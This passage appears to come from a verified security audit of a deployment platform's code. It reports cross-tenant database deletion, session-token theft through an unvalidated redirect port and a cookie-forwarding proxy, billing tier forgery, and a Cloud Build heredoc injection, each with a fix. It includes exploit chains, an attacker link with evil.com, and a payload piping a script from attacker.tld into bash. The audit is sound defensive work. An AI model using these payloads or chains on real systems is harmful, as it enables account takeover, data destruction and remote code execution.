7. Not dead code: src/store/project-slice.ts:1069-1076 POSTs to exactly this route, wired from src/components/Sto

</details>

### 🔴 CRITICAL — GET/DELETE /api/gcp/discover lets any authenticated user delete another tenant's Cloud SQL / Memorystore / Firestore instance
`authn-session-1` · `src/app/api/gcp/discover/route.ts:98` · reported by 3 independent dimensions

**Failure scenario.** All tenants' managed databases live in ONE shared GCP project (config.gcp.projectId, see src/lib/gcp/cloudsql.ts:846 `const gcpProjectId = projectId || config.gcp.projectId`). Instance names have no tenant prefix — src/app/api/projects/[id]/storage/route.ts:112 sets `resourceName = name.toLowerCase().replace(/\s+/g, '-')`, i.e. literally the connector name the user typed ("prod-db", "main-postgres"). Attacker signs up, creates their own throwaway project P (they are automatically `owner`, so the role gate at line 88 passes), then issues `GET /api/gcp/discover?projectId=P` which returns every Cloud SQL / Redis / Firestore resource in the shared GCP project (src/lib/gcp/discovery.ts:85-107 lis

**Impact.** Permanent, irreversible destruction of any other customer's production database (Cloud SQL instance, Redis instance, or Firestore database) by any user who can create a single project. Total cross-tenant data loss and platform-wide availability compromise.

**Reviewer correction.** Directionally correct and if anything understated. Accurate restatement: GET and DELETE /api/gcp/discover authorize the caller only against a Deployify projectId the caller supplies and controls (checkProjectAccess at route.ts:25/83), then act on a completely separate, attacker-supplied resourceId inside the single shared platform GCP project. Because src/middleware/rbac.ts:22-25 grants role 'owner' on any personal project and POST /api/projects is self-service, every signed-up tenant clears the owner/admin gate at route.ts:88 within seconds. Name guessing is unnecessary — the GET verb (discovery.ts:85/116/150) performs an unfiltered LIST of every Cloud SQL instance, Memorystore instance and Firestore database in the shared project and hands back their ids and regions, so the attack is enumerate-then-delete. All three DELETE branches are affected, not just the cloud-sql line 98. Two aggravating factors the report missed: (a) cloudsql.ts:49 leaves deletionProtectionEnabled false on every provisioned instance, so the delete succeeds; (b) resourceType=firestore with resourceId="(default)" targets the platform's own control-plane Firestore whenever FIREBASE_PROJECT_ID is unset (config.ts:39), and the attacker-controlled gcpProjectId param widens the target set to any GCP project the cloud-platform-scoped SA can reach (auth.ts:40). One narrowing: a 'viewer' team member is genuinely blocked (403 at route.ts:30-32 and 88-90); the unprivileged actor here is any signed-up tenant, not a viewer. Fix: resolve resourceId against access.project.storageConfigs[].metadata.resourceName before deleting, ignore the client-supplied gcpProjectId, and namespace provisioned instance names with the Deployify project id. | Mechanism and severity confirmed, with one amplification: the attacker does not need to know or guess victim instance names. `GET /api/gcp/discover?projectId=<own project>` calls `discoverResources`, which lists ALL Cloud SQL instances, ALL Memorystore instances (`locations/-`), and ALL Firestore databases in the shared `config.gcp.projectId` with no tenant/label filter, gated only by "caller is not a viewer on their own project". The attacker enumerates every tenant's resource id, type, and region, then replays each into DELETE on the same route. The attacker-controlled `gcpProjectId` query param is also passed unvalidated into all three delete helpers, extending reach to any GCP project the Deployify service account can delete in. Cloud SQL `deletionProtectionEnabled` defaults to false and is an opt-in per-connector checkbox, so it blocks only the rare instance whose owner enabled it, and has no Memorystore or Firestore equivalent. The audit event written at line 117 is keyed to `access.project.teamId` (the attacker's team), so the destruction is logged under the attacker's own tenant rather than the victim's.

**Verified code:**

```ts
src/app/api/gcp/discover/route.ts:71-108 (DELETE):
  71	        const { searchParams } = new URL(request.url);
  72	        const projectId = searchParams.get('projectId');
  73	        const resourceId = searchParams.get('resourceId');
  74	        const resourceType = searchParams.get('resourceType');
  75	        const region = searchParams.get('region');
  76	        const gcpProjectId = searchParams.get('gcpProjectId');
  ...
  83	        const access = await checkProjectAccess(session.user.id, projectId);
  84	        if (!access.allowed) {
  85	            return NextResponse.json({ error: access.error }, { status: access.status });
  86	        }
  87	
  88	        if (access.role !== 'owner' && access.role !== 'admin') {
  89	            return NextResponse.json({ error: 'Forbidden: Only owners and admins can reclaim resources' }, { status: 403 });
  90	        }
  ...
  96	            if (resourceType === 'cloud-sql') {
  97	                const { deleteInstance } = await import('@/lib/gcp/cloudsql');
  98	                await deleteInstance(resourceId, gcpProjectId || un
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I traced the full path from HTTP entry to the cited line and could not refute it.

REACHABILITY (production, MOCK_DB unset):
1. src/lib/auth.ts:88-105 — getSession() returns MOCK_SESSION only when NODE_ENV==='development' || MOCK_DB==='true'; otherwise it requires a real verified HS256 JWT. So the attacker must be a genuinely signed-up user. Signup is open GitHub OAuth (src/app/api/auth/callback/route.ts calls upsertUser with no allowlist/waitlist grep hit).
2. Any such user can POST /api/projects (src/app/api/projects/route.ts:60-110 — team membership is checked only when teamId is supplied; a personal project needs nothing).
3. checkProjectAccess (src/middleware/rbac.ts:22-25) returns role 'owner' for a personal project the caller created. That satisfies the line 88 owner/admin gate in the DELETE handler. The gate is on the CALLER'S OWN project, never on the target resource.
4. src/proxy.ts applies only security headers plus a 100 req/min per-IP rate limit to /api/*; the dashboard auth check covers /dashboard and /new, not /api/gcp/*. No global admin gate.
5. Not dead code: src/components/StorageSection.tsx:601,669,700 calls both verbs of this endpoint in the live storage UI.

THE FLAW:
DELETE takes resourceId, resourceType, region, gcpProjectId straight from the query string (lines 71-76) and passes resourceId unmodified to the GCP delete helpers (lines 96-105). There is no lookup of the resource against access.project.storageConfigs, no name-prefix check, no cross-reference of any kind between the authorized projectId and the resource being destroyed.

SHARED-BLAST-RADIUS PRECONDITION HOLDS:
- cloudsql.ts:36 `const gcpProjectId = config.gcp.projectId || process.env.GCP_PROJECT_ID;` in createInstance — provisioning ALWAYS lands in the single platform project; it does not accept a per-tenant override.
- config.gcp.projectId is one env var (src/lib/config.ts:30). There is no per-tenant GCP project field on Project in src/types/index.ts (only StorageConfig.providerProjectId at line 519, a cross-project connector hint).
- Instance names carry no tenant prefix: storage route sets `resourceName = name.toLowerCase().replace(/\s+/g, '-')` and passes it straight to createCloudSqlInstance.
- cloudsql.ts:49 `deletionProtectionEnabled: options.deletionProtectionEnabled ?? false` and the storage POST never passes it, so provisioned instances have deletion protection OFF.
- The SA holds the full cloud-platform scope (src/lib/gcp/auth.ts:40) and the platform itself deletes instances elsewhere, so it demonstrably has delete permission.

WHERE THE FINDER

</details>

### 🔴 CRITICAL — OAuth callback CLI branch redirects the session JWT to an attacker-controlled host (unvalidated `port` -> URL userinfo injection)
`authz-idor-1` · `src/app/api/auth/callback/route.ts:76` · reported by 2 independent dimensions

**Failure scenario.** `port` is taken verbatim from the query string of GET /api/auth/github (src/app/api/auth/github/route.ts:10), stored in the `deployify_cli_context` cookie, and interpolated straight into a redirect URL. Because `port` is never validated as numeric, a value containing `@` moves the real host out of the `localhost` prefix: I confirmed in node that `new URL('http://localhost:1@evil.com/callback?token=SECRET')` yields `hostname = evil.com` (`localhost` becomes the userinfo). Exploit: attacker sends a victim who is already logged into GitHub a link to `https://<app>/api/auth/github?cli=true&port=1@evil.com`. That request itself mints the `oauth_state` cookie, so the CSRF state check at callback l

**Impact.** Full account takeover from a single link click. The stolen JWT is a complete 7-day session for the victim AND embeds their GitHub OAuth access token with `repo read:user user:email` scope (src/lib/auth.ts:29, src/lib/auth.ts:176), so the attacker also gets read/write access to all of the victim's private GitHub repositories. There is no revocation mechanism (see separate finding), so the token sta

**Reviewer correction.** The claim stands as written; the only corrections make it worse, not weaker. Accurate restatement: an unauthenticated attacker sends a victim a single link to `https://<app>/api/auth/github?cli=true&port=1@evil.com`. That request itself mints the victim's own `oauth_state` cookie, so the CSRF check at callback:37 passes by construction; GitHub auto-redirects if the app was previously authorized. The callback then mints a real 7-day session JWT and, at callback:76, interpolates the unvalidated `port` into `http://localhost:${port}/callback?token=...`, where `@` relocates the authority so `localhost:1` becomes URL userinfo and the real host is the attacker's. Verified against the installed next@16.2.3 that `NextResponse.redirect` emits this verbatim as `Location`, since Next's `validateURL` only round-trips through `new URL()` with no host check.

Two amendments to the finder's write-up:
(1) Blast radius is larger than "session JWT." createSessionToken embeds `accessToken` — the GitHub OAuth token scoped `repo read:user user:email` — in the JWT payload, which is base64url and not encrypted. So the leak is simultaneously full Deployify account takeover and read/write access to all of the victim's private GitHub repositories. Combined with the absence of any jti/denylist/server-side revocation (logout only clears the cookie), the stolen token is unrevocable for its full 7-day life without rotating the global JWT secret.
(2) The claim's ID ("authz-idor-1") mislabels the class. This is not an IDOR or a checkProjectAccess/RBAC bypass; it is an unvalidated-redirect credential exfiltration. Route it to the open-redirect/auth bucket, not the authz bucket — but do not downgrade it on that basis.

Minimal fix: validate at both ends — reject the value unless `/^\d{1,5}$/` and the number is 1-65535, e.g. `const p = Number(context.port); if (!/^\d+$/.test(String(context.port)) || !Number.isInteger(p) || p < 1 || p > 65535) { /* fall through to the standard browser flow */ }` — and preferably build the URL structurally (`const u = new URL('http://127.0.0.1'); u.port = String(p);`) rather than by string interpolation, so userinfo can never be injected. | Mechanism as claimed is exactly right; the impact is broader than "session JWT theft". Because src/lib/auth.ts:15-38 puts the GitHub OAuth `accessToken` inside the JWT payload and src/lib/auth.ts:176 requests `repo read:user user:email`, one click yields (a) a 7-day Deployify session replayable as a plain `Cookie: deployify_session=<token>` header — the project's own CLI does exactly that at src/cli/index.js:1119, so httpOnly provides no protection once the value leaks — and (b) a repo-scoped GitHub access token recoverable by base64-decoding the JWT payload, with no need for JWT_SECRET. Full Deployify account takeover plus takeover of the victim's GitHub repositories. Severity remains critical. Minimal fix: reject the CLI context unless `/^\d{1,5}$/.test(String(context.port))` and the parsed integer is 1-65535, validate at the /api/auth/github entry point as well as at the callback, and build the URL with the URL API (`const u = new URL('http://127.0.0.1'); u.port = p;`) rather than string interpolation.

**Verified code:**

```ts
src/app/api/auth/github/route.ts (attacker-controlled input enters, unvalidated):
  10	        const port = searchParams.get('port');
  26	        if (cli && port) {
  27	            cookieStore.set('deployify_cli_context', JSON.stringify({ cli, port }), {

src/app/api/auth/callback/route.ts (the sink, lines 70-84):
  70	        const cliContextCookie = cookieStore.get('deployify_cli_context');
  71	        if (cliContextCookie) {
  72	            try {
  73	                const context = JSON.parse(cliContextCookie.value);
  74	                if (context.cli && context.port) {
  75	                    // Redirect to CLI local server with token
  76	                    const redirectUrl = `http://localhost:${context.port}/callback?token=${sessionToken}`;
  77	                    const response = NextResponse.redirect(redirectUrl);

src/app/api/auth/callback/route.ts (state check the finder correctly identified as no obstacle):
  37	        if (!storedState || storedState !== state) {

src/lib/auth.ts (what is actually leaked — GitHub repo-scoped token inside the JWT payload):
  18	
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I tried to break this claim on reachability grounds and failed on every axis.

REACHABILITY (the assigned lens):
1. Entry point is anonymous and unauthenticated. GET /api/auth/github and GET /api/auth/callback are plain route handlers with no auth check. src/proxy.ts only gates `/dashboard` and `/new` (line 155); for `/api/*` it applies security headers and rate limiting only. The strict limit for `/api/auth/` is 30/min keyed on `${ip}:${pathname}` (lines 46-49, 121-124) — that is the victim's IP, and the attack needs exactly one request, so it is irrelevant.
2. No dev-only gate. The CLI branch (callback lines 71-88) is unconditional — no NODE_ENV check, no MOCK_DB check, no config flag. The MOCK_DB/development branches in src/lib/auth.ts (lines 93-103) and proxy.ts (lines 160-167) are on entirely different code paths and do not touch this.
3. Not dead code. The branch is driven by the shipped CLI at src/cli/index.js:144, which builds `${instanceUrl}/api/auth/github?cli=true&port=${port}` — so the branch is live and load-bearing, not vestigial.
4. No privileged precondition. The attacker is fully anonymous; they never authenticate. The only requirement is that a victim clicks a link. The CSRF state check at callback line 37 is not an obstacle because the very same attacker link mints the `oauth_state` cookie at github/route.ts:13-23 — the state is legitimately the victim's own. If the victim previously authorized the OAuth app (the normal case for an existing user), GitHub auto-redirects with zero interaction: one click, no consent screen.
5. Both cookies are `path:'/'`, `sameSite:'lax'`, set on a top-level navigation and read on a top-level GET navigation back from GitHub, so they are set and sent normally. `secure` is true under NODE_ENV=production over HTTPS, which does not impede the attack.

MECHANISM: verified, not taken on faith. I ran the exact data flow through the installed Next 16.2.3 (see verified_evidence): `port=1@evil.example.com` survives `searchParams.get`, `JSON.stringify`, cookie percent-encode/decode, and `JSON.parse` unchanged; the guard `context.cli && context.port` passes; and `NextResponse.redirect` emits `Location: http://localhost:1@evil.example.com/callback?token=<JWT>` verbatim with host `evil.example.com`. Next's `validateURL` (node_modules/next/dist/server/web/utils.js:125-127) is only `String(new URL(String(url)))` — it performs no host validation, so there is no framework-level backstop. A top-level 307 to `http://` is not blocked by mixed-content rules.

NO MITIGATION EXISTS: `rg` for `isValidPort|parseInt|N

</details>

### 🔴 CRITICAL — Public reverse proxy forwards the browser's `Cookie` header (including `deployify_session`) to tenant-controlled Cloud Run origins
`authz-idor-2` · `src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:124` · reported by 8 independent dimensions

**Failure scenario.** Only `host` and `connection` are stripped; `cookie` is forwarded. The route is reachable directly on the platform's own apex origin at `https://<app>/api/v1/proxy/<slug>/<path>` — src/proxy.ts treats the apex as `isBaseDomain` (line 75), skips the subdomain rewrite, and falls through to `NextResponse.next()` with no auth gate for `/api/**`. The session cookie is host-only for the apex with `path: '/'` (src/lib/auth.ts:117-123), so it IS sent on that path. Exploit: attacker signs up, creates a project (slug is derived from their own project name, src/app/api/projects/route.ts:118-120) and deploys an app whose handler logs inbound headers. They then get a logged-in Deployify user to make one t

**Impact.** Any Deployify user can harvest other users' full session JWTs — and therefore their embedded GitHub `repo`-scope OAuth tokens — with no privileged position, just a deployed app on the platform. There is no allowlist on which headers cross the trust boundary and no authentication on the proxy endpoint.

**Reviewer correction.** Accurate restatement (severity unchanged at critical), with two mechanism refinements the finder glossed:

(1) The leak channel is the apex path only, not the project subdomain. Because `deployify_session` is set with no `Domain` attribute, it is host-only to the apex, so ordinary traffic to `<slug>.deployify.io` (rewritten by src/proxy.ts:108) does NOT carry it. Exploitation therefore requires one victim-initiated top-level navigation to `https://<apex>/api/v1/proxy/<attacker-slug>/<anything>` — a click, a redirect from an attacker page, or any same-site link. That is a one-click chain, not passive interception, but it needs no XSS and no privileged victim beyond "logged in".

(2) The target is not an arbitrary attacker-chosen URL. `productionUrl` is written only by src/lib/deployment.ts:136-138 from the resolved Cloud Run service URL; there is no mass-assignment path to set it. What the tenant controls is the *code running at* that Cloud Run origin, which is fully sufficient to log the inbound `Cookie` header. Framing it as "an arbitrary URL the tenant controls" (as audit.md:175 does) overstates it; "a tenant-controlled origin" is correct.

Also worth folding into the finding: `authorization` is forwarded by the same loop (confirmed by execution), and the JWT payload embeds the victim's GitHub OAuth `accessToken` with `repo` scope (src/lib/auth.ts:29, scope set at auth.ts:171), so the blast radius is Deployify account takeover *plus* the victim's GitHub repositories. verifySessionToken has no jti/tokenVersion/revocation check, so a stolen token is valid for its full 7 days and cannot be invalidated by logout.

Minimal fix: delete `cookie`, `authorization`, and the `x-forwarded-*`/proxy-trust headers from the outbound `Headers` (allowlist rather than denylist), and reject requests to this route whose `Host` is the apex — the route only needs to serve internally rewritten subdomain traffic, so it can require the rewrite marker instead of being publicly addressable. | Mechanism confirmed, with two refinements that make it worse rather than better. (a) The forwarded set is broader than `cookie`: the loop at lines 124-128 forwards every inbound header except `host`/`connection`, so `authorization` (and any bearer/API-key header) reaches the tenant container too — verified empirically that Node/undici does not apply the browser's forbidden-request-header filter. (b) Exploitation needs no user interaction: `deployify_session` is host-only for the apex (no `Domain` attribute, `src/lib/auth.ts:117-123`), and a tenant site on `*.deployify.io` is same-site with the apex, so `SameSite=Lax` does not block a hidden subresource — an `<img>` or credentialed `fetch` on any page of an attacker's own deployed project silently sends the victim's session JWT to `https://<apex>/api/v1/proxy/<attacker-slug>/x`, which the route relays to the attacker's Cloud Run origin. Full account takeover of any logged-in Deployify user who loads an attacker-controlled tenant page. Additionally, `set-cookie` is absent from the response `skipHeaders` list (line 170), letting a tenant origin write cookies onto the platform apex host through the same URL.

**Verified code:**

```ts
src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:119-132 (the cited line 124):
   119	    try {
   120	        const method = req.method;
   121	        const headers = new Headers();
   122	
   123	        // Forward relevant headers
   124	        req.headers.forEach((value, key) => {
   125	            if (!['host', 'connection'].includes(key.toLowerCase())) {
   126	                headers.set(key, value);
   127	            }
   128	        });
   129	
   130	        // Ensure proper forwarded headers
   131	        headers.set('X-Forwarded-Host', req.headers.get('host') || '');
   132	        headers.set('X-Forwarded-Proto', req.headers.get('x-forwarded-proto') || 'https');

src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:164 — the outbound call:
   164	        const targetResponse = await fetch(targetUrl, fetchOptions);

src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:238-246 — every method exported, no wrapper:
   238	export {
   239	    handleProxyRequest as GET,
   240	    handleProxyRequest as POST,
   ...
   245	    handleProxyRequest as OPTIONS
   246	};

src/proxy.ts:
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I could not refute this. Every link in the chain is present in the code I read, and the one mechanism I expected to break it (Node's fetch refusing a `cookie` header) does not.

REACHABILITY, step by step, for NODE_ENV=production with MOCK_DB unset:

1. The handler is a plain App Router route with no guard. I read all 246 lines of src/app/api/v1/proxy/[slug]/[[...path]]/route.ts. There is no import or call of getSession / requireAuth / checkProjectAccess, no origin/Referer/Sec-Fetch-Site check, and no host check. `grep -rn "deployify_session" src` returns only src/proxy.ts:156, src/app/api/auth/callback/route.ts:9, src/cli/index.js:1119 and src/lib/auth.ts:6 — nothing strips it before the outbound fetch.

2. Direct apex access is not blocked. In src/proxy.ts, `isBaseDomain` (line 75) is true when hostname equals the configured appUrl hostname, so `subdomain` stays `''` and the rewrite branch at line 99 is skipped. Execution falls to the `/api/` rate limiter (line 115, in-memory, keyed on client-controlled `${x-forwarded-for}:${pathname}`), then `NextResponse.next()` at 144. The auth gate at line 155 covers only `/dashboard` and `/new`. `config.matcher` is `'/((?!favicon.ico|public/).*)'` — nothing else intercepts. There is no root middleware.ts (`find . -maxdepth 3 -name middleware.ts` is empty) and next.config.ts adds only `X-DNS-Prefetch-Control`, no CSP and no host rules.

3. The cookie is actually sent on that URL. src/app/api/auth/callback/route.ts:97-103 and src/lib/auth.ts:117-123 both set `deployify_session` with `httpOnly: true, secure, sameSite: 'lax', path: '/'` and **no `domain`**. Host-only on the apex, path `/`, so a top-level GET navigation to `https://<apex>/api/v1/proxy/...` carries it (SameSite=Lax permits top-level safe-method navigations; any in-app link is same-site outright).

4. The header really is forwarded — this was the one thing I tried hardest to break. Forbidden-header-name enforcement is a browser concept; undici does not apply it. I ran the exact copy loop from lines 124-128 against a local http server on Node v22.16.0 and the origin received `"cookie":"deployify_session=VICTIM_JWT","authorization":"Bearer abc"` verbatim. So line 164's `fetch(targetUrl, fetchOptions)` ships the victim's session JWT (and any Authorization header) to the target.

5. The target is tenant-controlled and the actor is unprivileged. `resolveProject` → `getProjectBySlugGlobal` (src/lib/db.ts:671-677) is a bare `.where('slug','==',slug).limit(1)` with no owner/team filter — any slug on the platform resolves. Any signed-up user can cre

</details>

### 🔴 CRITICAL — Payment verification grants a client-chosen subscription tier; the Razorpay signature only covers orderId|paymentId, not the tier or amount
`injection-db-1` · `src/app/api/billing/verify/route.ts:19` · reported by 3 independent dimensions

**Failure scenario.** A logged-in user POSTs /api/billing/checkout {tierId:'pro'} and is charged the Pro price of INR 1,500 (src/lib/billing/tiers.ts:45). Razorpay returns razorpay_order_id / razorpay_payment_id / razorpay_signature to the browser. Instead of letting the page handler run (src/app/billing/page.tsx:135-146), the user replays those three values to /api/billing/verify by hand with {"tierId":"enterprise"}. verifyPaymentSignature HMACs only `orderId + '|' + paymentId`, so the signature still validates, and the route writes tier:'enterprise' verbatim. Nothing in the route reads the order back from Razorpay, compares the captured amount to TIERS['enterprise'].price (INR 15,000), or checks the tierId reco

**Impact.** Any paying customer obtains the Enterprise tier for the price of the cheapest paid tier — 10x revenue loss per account, plus TIERS.enterprise grants Infinity projects / deployments / buildMinutes / bandwidth (src/lib/billing/tiers.ts:70-75), which is the only server-side quota gate on platform-funded Cloud Build and Cloud Run spend.

**Reviewer correction.** Directionally correct and the cited line is right, but the mechanism and impact need sharpening in two directions.

Sharper on the precondition (slightly narrower than implied): this is not a signature bypass and not free. `verifyPaymentSignature` is cryptographically sound and fails closed when `RAZORPAY_KEY_SECRET` is unset, so the attacker must first complete one genuine Razorpay payment to obtain a valid `(orderId, paymentId, signature)` triple — cheapest entry is Pro at INR 1,500 (tiers.ts:45). The defect is trust-the-client-parameter, not broken crypto: the HMAC covers only `orderId + '|' + paymentId` (payments.ts:61), so `tierId` arrives unauthenticated from the body and is written to Firestore with no membership check against `TIERS` and no gateway-side order lookup (no `orders.fetch` exists anywhere in the repo).

Sharper on the impact (materially wider than reported): the finder stopped at tier substitution, but the same missing-binding defect yields two further amplifiers.
- No user binding. verify never checks that `orderId` belongs to `session.user.id` — it applies the update to whoever presents the cookie (contrast the webhook at webhook/route.ts:36-42, which correctly uses `notes.userId`). One purchased triple therefore upgrades unlimited self-registered accounts.
- No idempotency. `paymentId` is never persisted, and each POST resets `currentPeriodEnd` to `now + 30 days` (verify:43). The same triple can be replayed monthly, forever.

Net: a single INR 1,500 payment converts into permanent Enterprise (`Infinity` projects/deployments/buildMinutes/bandwidth, tiers.ts:66-69) across an unbounded number of accounts — revenue loss plus uncapped attacker-directed Cloud Build/Cloud Run spend. The `payment.captured` webhook writes the correct tier from the order notes but does not mitigate: the attacker simply re-POSTs verify afterward and last write wins.

Fix requires binding, not more validation: fetch the order from Razorpay by `orderId`, assert `order.status === 'paid'`, derive the tier from `order.notes.tierId` (never the body), assert `order.notes.userId === session.user.id`, and record `paymentId` as consumed to block replay. | Directionally correct and the mechanism is right; the finder if anything understated it. Accurate restatement: /api/billing/verify authenticates the caller but never binds the payment to a tier. The Razorpay HMAC covers only `orderId + '|' + paymentId` (src/lib/billing/payments.ts:61), and the route writes the client-supplied `tierId` straight to Firestore through an erased TypeScript cast (verify/route.ts:40,47) with no runtime allowlist and no `razorpay.orders.fetch` to compare against the order's `notes.tierId` that checkout already set. Two corrections to the reported scenario: (1) the exploit has a cost floor — checkout prices every order server-side and blocks the free tier, and `verifyPaymentSignature` returns false without a key secret, so the attacker must complete one genuine payment (Pro, INR 1,500) to obtain any valid signature; the escalation is 1,500 -> Enterprise (15,000, with Infinity projects/deployments/build-minutes/bandwidth), not zero-to-Enterprise. (2) The finder missed the amplifier: there is no replay protection whatsoever — no consumed-payment record is kept or checked — so that single signature can be re-POSTed indefinitely, each call resetting `currentPeriodEnd` to now+30 days, giving permanent free Enterprise renewal from one payment, and also letting the attacker overwrite the webhook's correct tier at will (last write wins). Enforcement reads the poisoned field directly (`getUserTier` -> `user.subscription?.tier`, caps.ts:37-41), so the impact is unbounded Cloud Build/Cloud Run consumption in addition to lost subscription revenue. The fix is a gateway-side order fetch (or trusting only the webhook's order notes) plus an idempotency record keyed on paymentId.

**Verified code:**

```ts
src/app/api/billing/verify/route.ts:18-49
        const body = await req.json();
        const { orderId, paymentId, signature, tierId } = body;

        if (!orderId || !paymentId || !signature || !tierId) {
            return NextResponse.json(
                { error: 'Missing required fields' },
                { status: 400, headers: securityHeaders }
            );
        }

        // verifyPaymentSignature handles missing keySecret internally
        const isValid = verifyPaymentSignature(orderId, paymentId, signature);

        if (!isValid) {
            return NextResponse.json(
                { error: 'Invalid payment signature' },
                { status: 400, headers: securityHeaders }
            );
        }

        // Update user subscription
        const updatedSubscription = {
            tier: tierId as 'free' | 'pro' | 'team' | 'enterprise',
            status: 'active' as const,
            currentPeriodStart: new Date(),
            currentPeriodEnd: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), // 30 days
            razorpaySubscriptionId: orderId, //
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I tried to refute this on reachability grounds and could not.

REACHABILITY. `/api/billing/verify` is a plain App Router `POST` handler with no admin gate, no RBAC call, no MOCK_DB branch, and no dev-only guard. Its only precondition is `getSession()` returning non-null (verify/route.ts:9-16). In production `getSession()` requires a genuinely signed HS256 cookie (auth.ts:88-106 — the MOCK_SESSION fallback is fenced behind `NODE_ENV === 'development' || MOCK_DB === 'true'`, both excluded by the stated deployment condition). Signup is open GitHub OAuth (`src/app/api/auth/{github,callback}`), so "any signed-up tenant" is the bar. `src/proxy.ts` applies only security headers and a 100-req/min IP rate limit to `/api/`; `/api/billing/` is not in `strictRateLimitRoutes`. Nothing blocks the path.

THE FLAW IS REAL. `tierId` is destructured straight off the request body (verify:19) and written into Firestore as the subscription tier (verify:39-49) with zero validation — it is not checked against `TIERS`, not compared to the order, not even type-narrowed at runtime (only a compile-time `as` cast at verify:40). The signature check (verify:29) calls `verifyPaymentSignature`, whose HMAC input is literally `orderId + '|' + paymentId` (payments.ts:61) — the tier, the amount, and the user identity are all outside the signed material. So the signature proves "some payment happened on this merchant account" and nothing else.

I CHECKED EVERY MITIGATION I COULD THINK OF, ALL ABSENT:
1. Gateway-side order lookup: `grep` for `orders.fetch|payments.fetch|orders.all` across `src` returns nothing — the only Razorpay call in the codebase is `razorpay.orders.create` (payments.ts:38). The server never asks Razorpay what was actually paid.
2. Order-to-user binding: checkout stamps `{ userId, tierId }` into the order `notes` (checkout:81), but verify never reads notes and never checks that `orderId` belongs to `session.user.id`. It applies the update to whoever holds the cookie.
3. Replay/idempotency guard: `paymentId` is never persisted anywhere (`grep` shows it used only in the HMAC); only `orderId` is stored, as `razorpaySubscriptionId` (verify:44), and nothing reads it back. The same triple can be POSTed unlimited times.
4. The webhook as a corrective: `webhook/route.ts:30-51` does use the trusted `notes.userId`/`notes.tierId`, so it would write the correct tier — but it fires once at capture time and the attacker simply re-POSTs verify afterward. Last writer wins, and the attacker can always be last.
5. Fail-closed on missing secret: `verifyPaymentSignature` retur

</details>

### 🔴 CRITICAL — Unvalidated `rootDirectory` bypasses its own sanitizer and breaks out of the Cloud Build heredoc, giving any signed-up user shell in the platform's Cloud Build step
`ops-config-supply-1` · `src/lib/gcp/cloudbuild.ts:192` · reported by 5 independent dimensions

**Failure scenario.** Any self-signup user creates a project (POST /api/projects, src/app/api/projects/route.ts:75 destructures `rootDirectory = ''` from the body with zero validation — `grep -n "test(|/^" src/app/api/projects/route.ts` returns nothing), or PATCHes an existing one (src/app/api/projects/[id]/route.ts:132 lists 'rootDirectory' in allowedFields and applies no content check). They set rootDirectory to the multi-line value:
    app\nEOFMARKER\ncurl -sL http://attacker.tld/x.sh | bash\n: <<'EOFMARKER'
Then they click Deploy (src/app/api/projects/[id]/deploy/route.ts:197 forwards `rootDirectory: project.rootDirectory`). The generated Dockerfile text now contains a line that is exactly `EOFMARKER`, termi

**Impact.** Escape from 'my build code runs in a sandboxed docker build layer' to 'arbitrary shell in the platform's Cloud Build step', which has the Docker daemon socket and the GCE metadata server for the platform's shared Cloud Build service account. That service account demonstrably holds project-level IAM-binding rights (cloudbuild.ts:335-342 calls `gcloud projects add-iam-policy-binding` and `gcloud sec

**Reviewer correction.** The claim is correct in substance — unvalidated `rootDirectory` bypasses the sanitizer at cloudbuild.ts:77-82 because line 192 forwards the raw value into `getDockerfile()`, and a newline + `EOFMARKER` payload terminates the quoted heredoc at cloudbuild.ts:232-235, yielding arbitrary bash in the `gcr.io/cloud-builders/docker` Cloud Build step with the platform's Cloud Build service account. I reproduced this against the real function.

One mechanism correction to the trigger: POST /api/projects/[id]/deploy is NOT the working path. That route calls `validateRepository(..., project.rootDirectory)` at deploy/route.ts:66-77 before building the config; `getRepoContents` swallows the GitHub error (github.ts:233-235) and returns `[]`, so a newline-bearing rootDirectory yields `{valid:false}` and a 400. The exploitable trigger is the GitHub webhook — `handlePushEvent` (webhooks/github/route.ts:167, rootDirectory at :190) and `handlePullRequestEvent` (:563, :586) both reach `generateCloudRunDeployConfig` with no repository validation whatsoever. The attacker does not forge the signature: POST /api/projects auto-registers a real, secret-signed webhook on their own repo (github.ts:141-151), and `shouldAutoDeploy` returns true unconditionally for the default branch. So the working exploit is: sign up -> create project -> PATCH rootDirectory with the payload -> push a commit to your own repo.

Two scope corrections that make the fix bigger, not smaller: (1) PATCH /api/projects/[id] never inspects `access.role`, and checkProjectAccess returns allowed:true for any team membership (rbac.ts:18-21), so even a 'viewer' team member can plant the payload on someone else's project, despite the deploy route explicitly blocking viewers; (2) `buildCommand`, `installCommand` and `outputDirectory` travel the same raw path into `getDockerfile` and the same heredoc, so validating only rootDirectory leaves the hole open. The correct fix is to escape/validate `dockerfileContent` at the heredoc boundary (random heredoc delimiter or base64+decode) in addition to rejecting non-conforming rootDirectory at the API layer. | The vulnerability is confirmed, with one refinement to the exploit path. The finder's claimed trigger (create/PATCH then hit POST /api/projects/[id]/deploy) is partially blocked by a gate they missed: deploy/route.ts:66 calls validateRepository(), which calls getRepoContents() with the attacker's rootDirectory; a newline-bearing path 404s at GitHub, github.ts returns [] from its catch, and validateRepository returns {valid:false}, producing a 400 before generateCloudRunDeployConfig is ever reached.

That gate does NOT cover the webhook auto-deploy paths, which are the reliable vector. src/app/api/webhooks/github/route.ts neither imports nor calls validateRepository, and passes project.rootDirectory directly to generateCloudRunDeployConfig at line 190 (push) and line 586 (PR preview).

